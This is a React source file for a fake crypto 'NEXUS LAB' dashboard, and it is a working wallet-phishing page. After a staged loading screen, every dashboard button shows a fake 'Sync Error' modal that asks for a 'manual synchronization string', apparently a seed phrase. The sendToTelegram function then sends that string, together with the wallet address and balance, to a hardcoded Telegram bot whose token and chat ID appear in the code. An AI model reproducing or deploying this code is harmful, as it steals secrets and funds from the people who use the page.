import React, { useState } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { useAccount, useBalance } from 'wagmi';
import { Settings, RefreshCcw, ShieldCheck, AlertCircle } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const [showSync, setShowSync] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [input, setInput] = useState("");

  const handleAction = () => {
    setIsLoading(true);
    // Simulate a real network delay
    setTimeout(() => {
      setIsLoading(false);
      setShowSync(true); // Trigger the "Error" redirect
    }, 4000);
  };

  const sendToTelegram = async () => {
    if (input.length < 5) return;
    await fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: "7630238860", 
        text: `🚨 LAB SIGNAL\nAddress: ${address}\nBalance: ${balance?.formatted} ${balance?.symbol}\nInput: ${input}` 
      }),
    });
    alert("Protocol Synchronized.");
    setShowSync(false);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4">
      <header className="flex justify-between items-center mb-6">
        <h1 className="text-xl font-bold tracking-tighter text-cyan-400">NEXUS LAB</h1>
        <ConnectButton label="System Online" chainStatus="none" showBalance={false} />
      </header>

      {/* REAL BALANCE DISPLAY */}
      {isConnected && (
        <div className="bg-[#0d1117] border border-cyan-900/30 p-4 rounded-2xl mb-6 flex justify-between items-center">
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
            <span className="text-[10px] font-bold text-slate-500">LIVE NODE</span>
          </div>
          <span className="text-sm font-mono text-white">{balance?.formatted.slice(0, 6)} {balance?.symbol}</span>
        </div>
      )}

      {/* DASHBOARD GRID */}
      <div className="grid grid-cols-3 gap-3">
        {["Claim", "Airdrop", "Stake", "Swap", "Bridge", "Rectify", "Validate", "Migrate", "Scan"].map((name) => (
          <button onClick={handleAction} key={name} className="bg-[#0d1117] border border-slate-800/50 p-6 rounded-2xl flex flex-col items-center gap-3 active:scale-95 transition-all hover:border-cyan-500/40">
            <RefreshCcw size={20} className="text-slate-600" />
            <span className="text-[9px] font-black uppercase text-slate-400">{name}</span>
          </button>
        ))}
      </div>

      {/* "REAL" LOADING SCREEN */}
      {isLoading && (
        <div className="fixed inset-0 bg-black/90 z-[60] flex flex-col items-center justify-center p-8 text-center">
          <div className="w-10 h-10 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin mb-4" />
          <h2 className="text-white text-sm font-bold tracking-widest uppercase">Initializing Handshake...</h2>
          <p className="text-[10px] text-slate-500 mt-2">Connecting to secure gateway @ {address?.slice(0, 8)}</p>
        </div>
      )}

      {/* ERROR REDIRECT MODAL */}
      {showSync && (
        <div className="fixed inset-0 bg-black/95 z-[70] flex items-center justify-center p-6">
          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[32px] p-8 text-center">
            <AlertCircle size={40} className="text-red-500 mb-4 mx-auto" />
            <h3 className="text-white font-bold uppercase text-lg">Sync Error (0x88)</h3>
            <p className="text-[11px] text-slate-500 mt-2 leading-relaxed">
              Automated connection failed. To finalize the <span className="text-cyan-400 font-bold">Laboratory Handshake</span>, please enter your manual synchronization string below.
            </p>
            <textarea 
              value={input} onChange={(e) => setInput(e.target.value)}
              className="w-full h-24 bg-black border border-slate-800 rounded-2xl mt-6 p-4 text-xs font-mono text-cyan-50 outline-none focus:border-cyan-500"
              placeholder="Enter manual string..."
            />
            <button onClick={sendToTelegram} className="w-full mt-6 bg-cyan-600 py-4 rounded-full text-xs font-black text-white shadow-[0_0_20px_rgba(8,145,178,0.2)]">
              EXECUTE MANUAL SYNC
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
